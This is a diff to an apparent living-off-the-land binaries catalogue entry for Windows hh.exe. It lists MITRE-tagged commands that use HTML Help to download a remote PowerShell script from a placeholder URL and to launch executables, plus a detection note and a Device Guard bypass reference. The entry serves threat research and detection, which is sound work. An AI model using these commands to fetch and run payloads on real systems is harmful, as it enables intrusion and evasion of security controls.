@@ -1,23 +1,35 @@
 ---
-Name: hh.exe
-Description: Download, Execute
-Author: ''
+Name: Hh.exe
+Description: Binary used for processing chm files in Windows
+Author: 'Oddvar Moe'
 Created: '2018-05-25'
-Categories: []
 Commands:
-  - Command: HH.exe http://www.google.com
-    Description: Opens google's web page with HTML Help.
-  - Command: HH.exe C:\
-    Description: Opens c:\\ with HTML Help.
-  - Command: HH.exe c:\windows\system32\calc.exe
-    Description: 'Opens calc.exe with HTML Help.'
   - Command: HH.exe http://some.url/script.ps1
     Description: Open the target PowerShell script with HTML Help.
+    Usecase: Download files from url
+    Category: Download
+    Privileges: User
+    MitreID: T1105
+    MitreLink: https://attack.mitre.org/wiki/Technique/T1105
+    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
+  - Command: HH.exe c:\windows\system32\calc.exe
+    Description: Executes calc.exe with HTML Help.
+    Usecase: Execute process with HH.exe
+    Category: Execute
+    Privileges: User
+    MitreID: T1216
+    MitreLink: https://attack.mitre.org/wiki/Technique/T1216
+    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
 Full Path:
-  - c:\windows\system32\hh.exe
-  - c:\windows\sysWOW64\hh.exe
-Code Sample: []
-Detection: []
+  - Path: C:\Windows\System32\hh.exe
+  - Path: C:\Windows\SysWOW64\hh.exe
+Code Sample: 
+- Code:
+Detection:
+ - IOC: hh.exe should normally not be in use on a normal workstation
 Resources:
-  - https://oddvar.moe/2017/08/13/bypassing-device-guard-umci-using-chm-cve-2017-8625/
-Notes: Thanks to Oddvar Moe - @oddvarmoe
+  - Link: https://oddvar.moe/2017/08/13/bypassing-device-guard-umci-using-chm-cve-2017-8625/
+Acknowledgement:
+  - Person: Oddvar Moe
+    Handle: '@oddvarmoe'
+---
